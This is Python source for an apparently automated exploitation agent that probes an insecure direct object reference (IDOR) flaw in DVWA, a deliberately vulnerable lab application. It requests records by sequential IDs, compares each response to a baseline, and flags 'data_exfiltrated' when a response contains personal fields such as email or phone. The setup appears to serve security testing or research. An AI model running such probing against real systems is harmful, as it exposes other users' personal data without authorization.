"""Tier 2 IDOR agent."""

from __future__ import annotations

from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import make_update, module_endpoint, normalize_security_level
from core.state import ExploitationState
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier


UNAUTHORIZED_DATA_SIGNALS = ["email", "address", "phone", "user", "profile"]


class IDORAgent(BaseAgent):
    module_name = "idor"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()
        self.verifier = Verifier()

    def check_prerequisites(self, state: ExploitationState) -> bool:
        return True

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/idor/")
        payload_set = self.payloads.get(self.module_name, level)

        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []
        tried_now: list[str] = []

        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        test_ids = ["1", "2", "3"]
        for token in list(payload_set.probe) + list(payload_set.exploit):
            if token.startswith("id="):
                test_ids.append(token.split("=", 1)[1])

        session = DVWASession(target_url)
        try:
            baseline = session.get(endpoint, params={"id": test_ids[0]})
            baseline_body = baseline.text or ""
            tried_now.append(f"id={test_ids[0]}")

            for candidate in test_ids[1:]:
                tried_now.append(f"id={candidate}")
                response = session.get(endpoint, params={"id": candidate})
                body = response.text or ""

                if body != baseline_body:
                    score = max(score, 1)
                    if "idor_confirmed" not in confirmed:
                        confirmed.append("idor_confirmed")

                if body != baseline_body and self.verifier.contains_any(body, UNAUTHORIZED_DATA_SIGNALS).ok:
                    score = 3
                    confirmed = ["idor_confirmed", "data_exfiltrated"]
                    outcomes = ["data_exfiltrated"]
                    break
        except Exception:
            pass
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            achieved_outcomes=outcomes,
        )


_AGENT = IDORAgent()


def idor_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
